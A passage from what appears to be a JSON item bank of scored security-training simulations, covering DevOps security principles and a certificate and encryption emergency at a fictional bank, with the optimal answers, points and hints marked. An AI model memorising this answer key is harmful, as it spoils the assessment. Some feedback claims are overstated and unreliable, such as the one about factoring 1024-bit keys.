            "feedback": "Complete team separation is expensive and creates handoff delays. Modern DevOps doesn't require separate teams - it requires appropriate controls within the process. Separation of duties can be achieved through process controls, not just organizational structure.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Separation of duties can be achieved through process controls and technical enforcement, not just organizational structure.",
            "consequences": {
              "immediate": "Organizational restructuring attempted",
              "security_impact": "Separation achieved but expensively",
              "business_impact": "Significant overhead and delays"
            }
          },
          {
            "id": "b",
            "text": "Implement process separation: peer review required (not self), production deployments require approval, production access limited and audited",
            "feedback": "Excellent! Separation of duties prevents single individuals from controlling entire processes. Peer review means others check your work. Deployment approval separates writing from releasing. Limited production access separates development from production operations. This prevents both fraud and errors.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Separation of duties can be implemented through process controls: peer review, approval gates, and access restrictions.",
            "consequences": {
              "immediate": "Process-based separation implemented",
              "security_impact": "Fraud and error risk reduced",
              "business_impact": "Controls added without major organizational change"
            }
          },
          {
            "id": "c",
            "text": "Add logging of all developer activities for deterrence",
            "feedback": "Logging is detective, not preventive. It records what happened but doesn't prevent a single person from committing fraud. Separation of duties prevents inappropriate actions; logging detects them after the fact. Both are needed.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Logging supports separation of duties but doesn't replace it. You need preventive controls, not just detection.",
            "consequences": {
              "immediate": "Logging enhanced",
              "security_impact": "Detection improved but prevention unchanged",
              "business_impact": "Fraud still possible, just recorded"
            }
          },
          {
            "id": "d",
            "text": "Trust the developers - they're professionals who wouldn't abuse access",
            "feedback": "Trust isn't a security control. Separation of duties protects honest people from suspicion, catches mistakes before they cause damage, and deters potential bad actors. Even trustworthy people make errors; controls prevent those errors from reaching production.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Separation of duties protects the organization and individuals. It's not about distrust - it's about preventing errors and fraud.",
            "consequences": {
              "immediate": "No changes made",
              "security_impact": "Fraud and error risk unchanged",
              "business_impact": "Audit finding remains unaddressed"
            }
          }
        ],
        "hints": [
          "What critical functions should no single person control?",
          "How do you separate duties without creating bottlenecks?"
        ]
      },
      {
        "id": "dp8",
        "sequence": 8,
        "title": "Security Through Obscurity",
        "situation": "A developer suggests: 'Let's make our API endpoints use random strings instead of predictable names. Hackers won't be able to find them if they don't know the URLs.'\n\nAnother developer argues: 'That's security through obscurity - it doesn't work.'\n\nThe team asks for your input.\n\nHow do you address this?",
        "options": [
          {
            "id": "a",
            "text": "Agree with the random URLs - making things harder to find adds security",
            "feedback": "Obscurity alone isn't security. Attackers can discover endpoints through traffic analysis, error messages, documentation leaks, or simply trying combinations. If the only protection is that attackers don't know the URL, you're vulnerable when they find it.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security through obscurity relies on attackers not knowing something. When they discover it (and they will), no protection remains.",
            "consequences": {
              "immediate": "Random URLs implemented",
              "security_impact": "False sense of security; underlying vulnerabilities remain",
              "business_impact": "May delay proper security controls"
            }
          },
          {
            "id": "b",
            "text": "Obscurity should not be the primary defense. Implement proper authentication and authorization; obscurity can be a minor additional layer but isn't a substitute for real controls",
            "feedback": "Excellent! Security should not rely on obscurity. APIs need authentication (verify identity), authorization (verify permission), input validation, and rate limiting. Unpredictable URLs might slightly slow reconnaissance but provide no real protection. Real security controls must be in place.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Security through obscurity is not a valid security strategy. It can complement real controls but never replace them.",
            "consequences": {
              "immediate": "Proper API security prioritized",
              "security_impact": "APIs protected by real controls",
              "business_impact": "Sustainable security architecture"
            }
          },
          {
            "id": "c",
            "text": "The second developer is right - any obscurity is bad security",
            "feedback": "Not quite. Obscurity shouldn't be relied upon, but it's not inherently bad. Hiding version numbers, using non-standard ports, or avoiding information disclosure are minor obscurity measures that can complement real security. The problem is relying on obscurity as primary defense.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Obscurity can complement security but shouldn't be the primary defense. Don't rely on it, but don't reject all obscurity either.",
            "consequences": {
              "immediate": "All obscurity measures rejected",
              "security_impact": "Real security controls implemented (good)",
              "business_impact": "May expose unnecessary information"
            }
          },
          {
            "id": "d",
            "text": "Let the developers decide - this is a technical implementation detail",
            "feedback": "This is a security architecture question, not just implementation detail. The approach to API security affects the entire application's security posture. Security should provide guidance on proper controls, not defer to developers on security architecture.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security should guide architecture decisions. Deferring security questions to developers without guidance may result in weak security.",
            "consequences": {
              "immediate": "Decision deferred",
              "security_impact": "May get weak security if obscurity is chosen",
              "business_impact": "Security not providing appropriate guidance"
            }
          }
        ],
        "hints": [
          "What happens when the 'secret' URLs are discovered?",
          "What should API security actually rely on?"
        ]
      },
      {
        "id": "dp9",
        "sequence": 9,
        "title": "Version Control for Security",
        "situation": "You're implementing change management for security configurations (firewall rules, access policies, security tool configs). Currently, changes are made directly in the systems with no version history.\n\nWhen a recent change caused an outage, no one could determine what changed or easily revert.\n\nHow do you address this?",
        "options": [
          {
            "id": "a",
            "text": "Create a change log spreadsheet where admins record what they changed",
            "feedback": "Manual change logs are inconsistent and often forgotten. They don't enable easy rollback. Version control systems provide automatic history, diff capability, and rollback. Infrastructure as Code (IaC) extends version control to configurations.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Manual change logs are unreliable. Version control provides automatic, complete history with rollback capability.",
            "consequences": {
              "immediate": "Manual logging implemented",
              "security_impact": "Inconsistent tracking; no rollback capability",
              "business_impact": "Still can't easily identify or revert changes"
            }
          },
          {
            "id": "b",
            "text": "Implement Infrastructure as Code: security configurations in version control, changes through pull requests, automated deployment",
            "feedback": "Excellent! Infrastructure as Code (IaC) applies software development practices to infrastructure. Configurations stored in Git provide version history. Pull requests enable review before changes. Automated deployment ensures what's in code matches reality. This enables change tracking, review, and rollback.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Infrastructure as Code provides version control, review process, and rollback capability for configuration changes.",
            "consequences": {
              "immediate": "IaC implemented for security configurations",
              "security_impact": "Changes tracked, reviewed, and reversible",
              "business_impact": "Faster incident recovery; better change control"
            }
          },
          {
            "id": "c",
            "text": "Require manager approval before any security configuration change",
            "feedback": "Approval adds authorization but doesn't provide version history or rollback. The issue is not knowing what changed and being unable to revert. Approval without version control means you have authorized changes you still can't track or reverse.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Approval authorizes changes but doesn't track them. Version control is needed for history and rollback.",
            "consequences": {
              "immediate": "Approval process added",
              "security_impact": "Authorization improved; tracking unchanged",
              "business_impact": "Still can't identify or revert changes"
            }
          },
          {
            "id": "d",
            "text": "Enable audit logging in all security systems",
            "feedback": "Audit logging helps identify what changed but may not capture the full configuration state or enable easy rollback. Version control provides complete configuration history and the ability to return to any previous state. Logging complements but doesn't replace version control.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Audit logs show what changed. Version control stores complete configurations and enables rollback.",
            "consequences": {
              "immediate": "Audit logging enabled",
              "security_impact": "Can see what changed; rollback still difficult",
              "business_impact": "Better visibility but recovery still challenging"
            }
          }
        ],
        "hints": [
          "What do you need to know what changed and revert if needed?",
          "How can software development practices help with infrastructure?"
        ]
      },
      {
        "id": "dp10",
        "sequence": 10,
        "title": "Secure Defaults",
        "situation": "A new microservice is being deployed. The developer asks: 'Should I enable all features by default so users have full functionality, or start with minimal features enabled?'\n\nThis relates to secure defaults and the principle of fail-secure.\n\nHow do you advise?",
        "options": [
          {
            "id": "a",
            "text": "Enable all features - users expect full functionality and will complain if things are disabled",
            "feedback": "Default-open is insecure. Users may not realize features are enabled. Attack surface is maximized. If a vulnerability exists in an enabled feature, all instances are vulnerable even if they don't use that feature. Secure defaults minimize exposure.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Secure defaults means minimal functionality enabled by default. Users enable what they need, reducing attack surface.",
            "consequences": {
              "immediate": "All features enabled by default",
              "security_impact": "Maximum attack surface; unused features may be vulnerable",
              "business_impact": "User convenience but security risk"
            }
          },
          {
            "id": "b",
            "text": "Secure defaults: minimal features enabled by default, users explicitly enable what they need, fail-secure when errors occur",
            "feedback": "Excellent! Secure defaults minimize attack surface. Only necessary features enabled; additional features require explicit action. Fail-secure means when something goes wrong, the system fails to a secure state (deny access) rather than insecure (allow access). This reduces risk from unused features and failure scenarios.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Secure defaults = minimal features enabled. Fail-secure = system fails to secure state, not open state.",
            "consequences": {
              "immediate": "Minimal default configuration",
              "security_impact": "Reduced attack surface; fail-secure behavior",
              "business_impact": "Users enable what they need; unused features aren't exposed"
            }
          },
          {
            "id": "c",
            "text": "Let the developer decide based on their understanding of user needs",
            "feedback": "Security defaults should be a security decision, not left to individual developer judgment. Developers may prioritize functionality over security. Security should establish guidelines for secure defaults that all services follow.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security should establish default configuration standards, not leave it to individual developers.",
            "consequences": {
              "immediate": "Decision deferred to developer",
              "security_impact": "Inconsistent security posture across services",
              "business_impact": "No standard approach"
            }
          },
          {
            "id": "d",
            "text": "It depends on the specific feature - evaluate each one individually",
            "feedback": "While individual evaluation is valuable, the principle should be secure defaults. Start from minimal and justify additions, not start from maximal and justify removals. The default mindset should be 'off unless needed' not 'on unless problematic'.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Secure defaults as a principle means starting minimal. Individual evaluation determines what to enable, starting from off.",
            "consequences": {
              "immediate": "Case-by-case evaluation",
              "security_impact": "May end up enabling more than needed",
              "business_impact": "Inconsistent approach; more effort"
            }
          }
        ],
        "hints": [
          "What's the secure starting point - everything on or everything off?",
          "What should happen when something fails - open or closed?"
        ]
      }
    ],
    "glossary": {
      "CIA_triad": "Confidentiality, Integrity, Availability - core security objectives",
      "AAA": "Authentication, Authorization, Accounting - security framework",
      "least_privilege": "Granting minimum access needed for job function",
      "separation_of_duties": "Dividing critical functions among different people",
      "non_repudiation": "Assurance that actions cannot be denied",
      "change_management": "Process for controlling modifications to systems",
      "secure_defaults": "Systems configured securely out of the box",
      "fail_secure": "Failing to secure state when errors occur",
      "infrastructure_as_code": "Managing infrastructure through version-controlled code"
    },
    "outcomes": {
      "optimal_path_summary": "You helped TechForward Solutions implement foundational security concepts across their development environment. By applying the CIA triad for decision-making, implementing risk-based authentication and least privilege authorization, establishing change management without sacrificing velocity, and embedding security principles like non-repudiation and secure defaults, you addressed audit findings while maintaining development productivity.",
      "key_achievements": [
        "CIA triad framework for security decision-making",
        "Risk-based authentication across systems",
        "Least privilege with RBAC implementation",
        "Risk-based change management with CI/CD integration",
        "Non-repudiation through individual accountability",
        "Separation of duties without bottlenecks",
        "Infrastructure as Code for security configurations",
        "Secure defaults principle embedded in development"
      ],
      "lessons_learned": [
        "CIA triad provides framework for balanced security decisions",
        "AAA (Authentication, Authorization, Accounting) are foundational security functions",
        "Least privilege minimizes access to what's needed",
        "Change management can be risk-based to maintain velocity",
        "Non-repudiation requires individual accountability",
        "Separation of duties prevents fraud and errors",
        "Security through obscurity is not a valid security strategy",
        "Secure defaults minimize attack surface"
      ]
    },
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D1-SIM-003",
    "title": "The Encryption Emergency",
    "domain": 1,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "35-45 minutes",
    "role": "security_engineer",
    "organization": {
      "name": "Quantum Financial Services",
      "industry": "Financial Services / Banking",
      "size": "Regional bank, 2,500 employees, 500,000 customers"
    },
    "introduction": "Welcome to The Encryption Emergency. You will make critical security decisions.",
    "learning_objectives": [
      "1.4"
    ],
    "decision_points": [
      {
        "id": "D1S3-DP-001",
        "sequence": 1,
        "title": "Emergency Response Priority",
        "situation": "You've just been briefed on the situation. The CISO wants your immediate assessment and action plan. You have 72 hours before the main certificate expires, but multiple cryptographic issues need attention.\n\n**Question:** What should be your FIRST priority action?",
        "options": [
          {
            "id": "A",
            "text": "Immediately purchase and install a new wildcard certificate from a trusted CA for the customer portal",
            "feedback": "Correct. The 72-hour expiring certificate for customer-facing services is the most critical and time-sensitive issue. Certificate expiration would cause immediate service disruption and security warnings for all 500,000 customers. While other issues are important, they don't have the same immediate deadline.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Focus on upgrading all deprecated algorithms (3DES, SHA-1) since these are active security vulnerabilities",
            "feedback": "While deprecated algorithms are security concerns, they're not causing immediate service disruption. The expiring certificate will break the customer portal in 72 hours - that's your most urgent deadline. Algorithm upgrades can be planned more carefully.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Set up a new internal Certificate Authority to handle all certificates going forward",
            "feedback": "Internal CAs can't be used for public-facing services - browsers won't trust them. Your customer portal needs a certificate from a publicly trusted CA. Additionally, setting up a proper internal CA takes time you don't have.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Disable HTTPS temporarily and run the portal on HTTP until the certificate situation is resolved",
            "feedback": "This would be a massive security and compliance violation for a financial institution. Running a banking portal without encryption exposes all customer credentials, session tokens, and financial data. PCI DSS absolutely prohibits this, and you'd face immediate regulatory action.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Consider which issue has the hardest deadline and most immediate customer impact.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Certificate expiration causes immediate, visible service disruption. Deprecated algorithms are vulnerabilities but services still function.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S3-DP-002",
        "sequence": 2,
        "title": "Certificate Type Selection",
        "situation": "You're procuring a new certificate from DigiCert, a well-trusted CA. You need to decide what type of certificate to order for the customer-facing infrastructure.\n\n**Question:** Which certificate type is MOST appropriate for Quantum Financial's customer portal?",
        "options": [
          {
            "id": "A",
            "text": "Domain Validation (DV) wildcard certificate - fastest issuance, covers all subdomains",
            "feedback": "DV certificates only verify domain ownership, not organization identity. For a financial institution handling sensitive customer data, this provides minimal trust assurance. Customers and regulators expect higher validation for banking services.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Extended Validation (EV) certificate for the main domain only",
            "feedback": "EV provides the highest validation level and was traditionally shown with green bar indicators. However, a single-domain EV won't cover your subdomains (portal, api, www), requiring multiple certificates or leaving services unprotected.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Organization Validation (OV) wildcard certificate with specific SANs for critical subdomains",
            "feedback": "Excellent choice. OV certificates verify organizational identity (appropriate for financial services), wildcards cover subdomains efficiently, and adding specific SANs ensures critical services are explicitly covered. This balances security assurance, coverage, and manageability.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Self-signed certificate as a temporary measure while proper certificates are obtained",
            "feedback": "Self-signed certificates would trigger security warnings in all browsers, alarming customers and likely violating PCI DSS requirements for trusted certificates. This is not acceptable for a production financial services portal.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Consider what level of identity assurance is appropriate for a financial institution.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "OV balances identity verification with practical coverage needs. Think about subdomain coverage too.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S3-DP-003",
        "sequence": 3,
        "title": "Key Generation Security",
        "situation": "The new certificate requires generating a new key pair. Your team asks where and how the private key should be generated.\n\n**Question:** What is the MOST secure method for generating the private key for this critical certificate?",
        "options": [
          {
            "id": "A",
            "text": "Generate on the web server where it will be used, then back up to network storage",
            "feedback": "Generating keys on production servers is risky - the server may be compromised, and the key is immediately exposed to potential attacks. Backing up private keys to network storage creates additional exposure points and violates key management best practices.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Use the CA's key generation service - they generate it and send both certificate and key",
            "feedback": "Never let a third party generate your private keys. The fundamental principle of PKI is that private keys should never leave the entity that owns them. If the CA generates your key, they have a copy, which defeats the purpose of asymmetric cryptography.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Generate on an air-gapped workstation, create CSR, securely transfer to HSM after certificate issuance",
            "feedback": "Air-gapped generation is good practice, but the key should ideally be generated directly in the HSM and never exist outside it. Transferring keys, even securely, creates a window of exposure and complexity.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Generate the key pair directly within the Hardware Security Module (HSM), export only the CSR",
            "feedback": "Perfect. HSM-generated keys never exist outside the tamper-resistant hardware. Only the Certificate Signing Request (CSR) containing the public key is exported to send to the CA. This provides the highest level of private key protection and meets compliance requirements.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "The private key should never exist in an unprotected state or be known to third parties.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "HSMs provide tamper-resistant key storage where keys are generated and used without ever being exposed.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S3-DP-004",
        "sequence": 4,
        "title": "Algorithm Selection for New Certificate",
        "situation": "When generating the CSR, you need to specify the key algorithm and size. The certificate will protect financial transactions for the next year.\n\n**Question:** Which key algorithm and parameters should you select for the new certificate?",
        "options": [
          {
            "id": "A",
            "text": "RSA 2048-bit with SHA-256 signature",
            "feedback": "RSA 2048 with SHA-256 meets current minimum standards and is widely compatible. However, for a financial institution looking forward, this represents the floor rather than a strong security posture. NIST recommends transitioning to stronger options.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "RSA 4096-bit with SHA-384 signature",
            "feedback": "Excellent choice. RSA 4096 provides strong security margin for the certificate's lifetime and beyond. SHA-384 offers stronger collision resistance than SHA-256. This combination offers excellent compatibility while exceeding minimum requirements - appropriate for financial services.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "ECDSA P-256 (secp256r1) with SHA-256 signature",
            "feedback": "ECDSA P-256 provides equivalent security to RSA 3072 with much smaller keys and faster operations. It's a valid modern choice. However, some older systems and clients may have compatibility issues with ECC certificates, which could affect some customers.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "RSA 1024-bit for performance, since the load balancer handles many connections",
            "feedback": "RSA 1024-bit has been deprecated and considered insecure since 2013. NIST, PCI DSS, and all major standards prohibit its use. Modern computing can factor 1024-bit keys. This would fail compliance audits and provide inadequate protection.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Consider both current security requirements and forward-looking protection for the certificate's lifetime.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Financial services should exceed minimums. RSA 4096 or ECC P-384 provide strong margins.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S3-DP-005",
        "sequence": 5,
        "title": "Legacy System Encryption Upgrade",
        "situation": "While the new certificate is being issued, you turn attention to the deprecated encryption findings. The payroll system using 3DES processes sensitive employee financial data. The vendor says the system 'requires' 3DES.\n\n**Question:** How should you approach the legacy payroll system's 3DES usage?",
        "options": [
          {
            "id": "A",
            "text": "Accept the vendor's statement - if the system requires 3DES, document it as a compensating control exception",
            "feedback": "Simply accepting vendor limitations without investigation isn't due diligence. 3DES is deprecated and will eventually be prohibited entirely. A compensating control exception requires actual compensating controls, not just documentation of the weakness.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Immediately disable 3DES on the system to enforce compliance",
            "feedback": "Abruptly disabling encryption without a migration path could break the payroll system entirely, preventing employees from being paid. This could cause more harm than the vulnerability. Changes need to be planned and tested.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Research the system's actual capabilities, engage vendor support for upgrade path, implement network segmentation as interim control",
            "feedback": "Excellent systematic approach. Many 'requirements' are actually defaults that can be changed. Engaging the vendor properly often reveals upgrade paths. Network segmentation reduces exposure while you work on the permanent fix - a true compensating control.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Replace the entire payroll system with a modern cloud-based solution",
            "feedback": "While modernization may be the right long-term answer, replacing an entire payroll system is a major project taking months or years. It doesn't address the immediate vulnerability and introduces significant business risk. You need interim solutions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Vendor claims should be verified. Also consider interim risk reduction while working on permanent fixes.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Network segmentation can limit exposure of vulnerable systems. Always check if upgrades or configuration changes are actually available.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S3-DP-006",
        "sequence": 6,
        "title": "TLS Configuration Hardening",
        "situation": "The scan found servers with TLS 1.0 and SSL 3.0 enabled. You need to establish a secure TLS configuration standard for the environment.\n\n**Question:** What TLS configuration should be your new standard?",
        "options": [
          {
            "id": "A",
            "text": "TLS 1.2 minimum, disable TLS 1.0/1.1/SSL 3.0, prefer ECDHE cipher suites, disable CBC mode ciphers",
            "feedback": "Excellent configuration. TLS 1.2 minimum aligns with PCI DSS requirements and industry standards. ECDHE provides perfect forward secrecy. Disabling CBC mode prevents BEAST/POODLE class attacks. This balances strong security with reasonable compatibility.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "TLS 1.3 only - it's the most secure and eliminates all legacy vulnerabilities",
            "feedback": "TLS 1.3 is the most secure, but requiring it exclusively may break compatibility with older clients, partners, or integrated systems. Some financial partners and older mobile apps may not support TLS 1.3 yet. A 1.2/1.3 approach is more practical.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Keep TLS 1.0 enabled for compatibility but disable SSL 3.0 and weak ciphers",
            "feedback": "TLS 1.0 has been deprecated and is explicitly prohibited by PCI DSS as of 2018. Keeping it enabled would be a compliance violation. The compatibility argument no longer holds - virtually all modern systems support TLS 1.2.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Allow all TLS versions but prioritize the strongest ciphers through server preference",
            "feedback": "Protocol version downgrade attacks can force connections to use weaker versions even with server preference. If TLS 1.0 or SSL 3.0 is enabled, attackers can exploit their known vulnerabilities. Weak protocols must be disabled entirely.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "PCI DSS requires TLS 1.2 minimum for cardholder data environments. Consider compliance requirements.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Balance security with compatibility. TLS 1.2 is widely supported. Perfect forward secrecy (ECDHE) protects past sessions if keys are compromised.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S3-DP-007",
        "sequence": 7,
        "title": "Certificate Installation Validation",
        "situation": "The new certificate has been issued and installed on the load balancers. Before switching production traffic, you need to validate the installation.\n\n**Question:** What is the MOST comprehensive way to validate the certificate installation?",
        "options": [
          {
            "id": "A",
            "text": "Check that the browser shows a padlock icon when accessing the site",
            "feedback": "The padlock only indicates a valid TLS connection exists, not that the certificate is correctly configured. It doesn't verify the full certificate chain, proper hostname coverage, cipher suite configuration, or other critical parameters.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Use SSL/TLS testing tools (SSL Labs, testssl.sh) to perform comprehensive configuration analysis",
            "feedback": "Excellent. Tools like SSL Labs or testssl.sh provide comprehensive analysis including: certificate chain validation, hostname matching, cipher suite evaluation, protocol support, known vulnerability checks (Heartbleed, ROBOT, etc.), and overall security grading.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Verify the certificate expiration date is correct in the server configuration",
            "feedback": "Expiration date is just one attribute. You also need to verify: complete certificate chain is installed, hostname/SAN matches all required domains, no configuration errors, strong cipher suites, and no protocol vulnerabilities.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Run openssl s_client to check if the connection establishes successfully",
            "feedback": "openssl s_client is useful for debugging but doesn't automatically check for misconfigurations, weak ciphers, or vulnerabilities. It shows what's configured but doesn't evaluate whether it's secure or complete.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Manual checks can miss subtle issues. Automated testing tools check many parameters simultaneously.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "SSL Labs (ssllabs.com) is the industry standard for TLS configuration testing and provides letter grades with detailed findings.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S3-DP-008",
        "sequence": 8,
        "title": "Key Management Policy",
        "situation": "With the immediate crisis resolved, the CISO asks you to recommend improvements to prevent future certificate emergencies. Current processes are informal with no centralized tracking.\n\n**Question:** What key management improvement should be your TOP recommendation?",
        "options": [
          {
            "id": "A",
            "text": "Implement certificate lifecycle management with automated discovery, inventory, and expiration alerts",
            "feedback": "Excellent. Automated certificate lifecycle management (CLM) addresses the root cause - lack of visibility and proactive management. Features include: automatic discovery of all certificates, centralized inventory, expiration alerts (90/60/30 days), renewal automation, and compliance reporting.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Create a spreadsheet to track all certificates and their expiration dates",
            "feedback": "Spreadsheet tracking is better than nothing but is error-prone, requires manual updates, doesn't discover unknown certificates, and depends on someone remembering to check it. In an environment with 200+ applications, manual tracking will fail.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Require longer certificate validity periods (2-3 years) to reduce management burden",
            "feedback": "Industry trend is actually toward shorter validity (maximum 398 days for public certificates since 2020). Longer validity increases the impact window if a private key is compromised and delays adoption of stronger algorithms. Better automation is the solution, not less frequent rotation.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Move all certificates to a single CA for simplified management",
            "feedback": "CA consolidation provides some simplification but doesn't address discovery, tracking, or alerting. It also creates single-point-of-failure risk - as you just experienced when TrustMark was distrusted. Multi-CA strategy with good management tooling is more resilient.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What was the root cause of this emergency? Lack of visibility into certificate status.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Certificate Lifecycle Management (CLM) tools automate discovery, tracking, alerting, and can even automate renewals.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S3-DP-009",
        "sequence": 9,
        "title": "Cryptographic Agility Planning",
        "situation": "Looking further ahead, the CISO mentions concerns about quantum computing threats to current cryptography. They ask for your perspective on future-proofing the cryptographic infrastructure.\n\n**Question:** What should be your approach to quantum computing cryptographic threats?",
        "options": [
          {
            "id": "A",
            "text": "Quantum computers are decades away from being a real threat - focus on current issues only",
            "feedback": "This underestimates the 'harvest now, decrypt later' threat and the time required for cryptographic transitions. Nation-states may already be capturing encrypted traffic to decrypt when quantum capability arrives. Organizations need years to transition algorithms.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Immediately switch all systems to post-quantum cryptographic algorithms",
            "feedback": "Post-quantum algorithms are still being standardized (NIST finalized first standards in 2024). Immediate wholesale replacement is premature, risky, and would face compatibility issues. A measured, phased approach is needed.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Develop a cryptographic agility strategy: inventory current algorithms, monitor NIST standards, plan phased migration, prioritize high-value data",
            "feedback": "Excellent strategic approach. Cryptographic agility means designing systems that can transition to new algorithms with minimal disruption. Key steps: complete crypto inventory, track emerging standards, identify long-retention sensitive data, plan migration timeline, and build agility into new systems.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Increase all current key sizes to maximum (RSA 8192, AES-512) to resist quantum attacks",
            "feedback": "Larger keys for current algorithms don't protect against quantum attacks. Shor's algorithm breaks RSA/ECC regardless of key size. Grover's algorithm halves effective symmetric key strength (AES-256 \u00e2\u2020\u2019 128-bit equivalent), but AES-512 doesn't exist. Different algorithm families are needed.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Balance current practicality with future preparedness. Wholesale immediate changes aren't practical.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Cryptographic agility - the ability to swap algorithms without major system changes - is the recommended approach for quantum preparedness.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S3-DP-010",
        "sequence": 10,
        "title": "Documentation and Handoff",
        "situation": "The emergency is resolved. The CISO asks you to document the incident and improvements for the security team and future reference.\n\n**Question:** What should be the PRIMARY focus of your documentation?",
        "options": [
          {
            "id": "A",
            "text": "Technical details of every configuration change made during the emergency",
            "feedback": "Technical changes should be documented, but purely technical documentation doesn't address the systemic issues that caused the emergency or help prevent recurrence. Focus on lessons learned and process improvements.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
